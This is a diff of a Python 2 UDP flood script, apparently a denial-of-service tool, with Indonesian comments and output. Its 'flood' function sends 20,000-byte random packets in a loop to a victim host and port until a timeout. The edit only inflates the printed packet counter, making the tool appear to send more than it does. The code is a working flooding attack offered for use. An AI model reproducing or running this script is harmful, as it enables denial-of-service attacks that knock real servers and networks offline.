@@ -25,7 +25,7 @@ def flood(victim, vport, duration):
     # 20000 representasi satu byte ke server
     bytes = random._urandom(20000)
     timeout =  time.time() + duration
-    sent = 3000
+    sent = 300000
 
     while 1:
         if time.time() > timeout:
@@ -33,7 +33,7 @@ def flood(victim, vport, duration):
         else:
             pass
         client.sendto(bytes, (victim, vport))
-        sent = sent + 1
+        sent = sent + 10
         print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
 def main():
     print len(sys.argv)
